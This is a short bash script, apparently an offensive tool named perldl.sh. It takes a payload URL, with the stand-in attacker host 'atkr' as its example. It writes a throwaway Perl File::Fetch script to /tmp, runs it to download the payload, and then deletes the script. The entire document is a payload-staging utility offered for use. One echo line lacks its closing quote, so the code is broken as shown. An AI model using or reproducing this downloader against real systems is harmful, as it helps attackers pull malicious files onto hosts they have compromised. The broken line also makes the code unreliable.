#!/bin/bash

if [[ $1 == "" ]]; then
    echo "Usage: ./perldl.sh [payload url]"
    echo "Example: ./perldl.sh http://atkr/file
    exit 1;
fi 
PAYLOADURL="$1"
PERL=$(which perl)
printf '#!'$PERL'\n\nuse File::Fetch;\nmy $url = '\"$PAYLOADURL\"';\nmy $ff = File::Fetch->new(uri => $url);\nmy $file = $ff->fetch() or die $ff->error;' > /tmp/d && $PERL /tmp/d
rm /tmp/d
